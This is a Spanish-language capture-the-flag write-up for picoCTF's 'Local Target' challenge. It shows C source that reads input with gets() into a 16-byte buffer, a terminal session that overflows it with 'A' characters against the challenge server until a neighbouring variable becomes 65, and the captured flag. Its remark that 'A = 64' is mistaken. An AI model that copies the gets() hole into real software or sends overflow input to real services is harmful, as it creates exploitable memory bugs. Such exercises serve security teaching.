# Local Target



## Descripción
Smash the stack
Additional details will be available after launching your challenge instance.

Can you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/518/local-target). You can view source [here](https://artifacts.picoctf.net/c/518/local-target.c). And connect with it using: `nc saturn.picoctf.net 51966`

## Solución

- Vemos lo que contiene el archivo .c
-  Para encontrar la bandera el numero tiene que ser 65. A = 64.
- Con 25 'A' obtenemos la bandera:
``` bash
┌──(kali㉿kali)-[~/Descargas/3P]
└─$ ls
local-target  local-target.c
                                                                                                                                                           
┌──(kali㉿kali)-[~/Descargas/3P]
└─$ cat local-target.c
#include <stdio.h>
#include <stdlib.h>



int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}
                                                                                                                                                           
┌──(kali㉿kali)-[~/Descargas/3P]
└─$ nc saturn.picoctf.net 51966
Enter a string: A

num is 64
Bye!
                                                                                                                                                           
┌──(kali㉿kali)-[~/Descargas/3P]
└─$ nc saturn.picoctf.net 51966
Enter a string: AAAAA

num is 64
Bye!
                                                                                                                                                           
┌──(kali㉿kali)-[~/Descargas/3P]
└─$ nc saturn.picoctf.net 51966
Enter a string: AAAAAAAAAAAAAAA

num is 64
Bye!
                                                                                                                                                           
┌──(kali㉿kali)-[~/Descargas/3P]
└─$ nc saturn.picoctf.net 51966
Enter a string: AAAAAAAAAAAAAAAAAAAAAA

num is 64
Bye!
                                                                                                                                                           
┌──(kali㉿kali)-[~/Descargas/3P]
└─$ nc saturn.picoctf.net 51966
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}
                                                                                                                                                           
┌──(kali㉿kali)-[~/Descargas/3P]
└─$ 


``` 

## Bandera 
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}

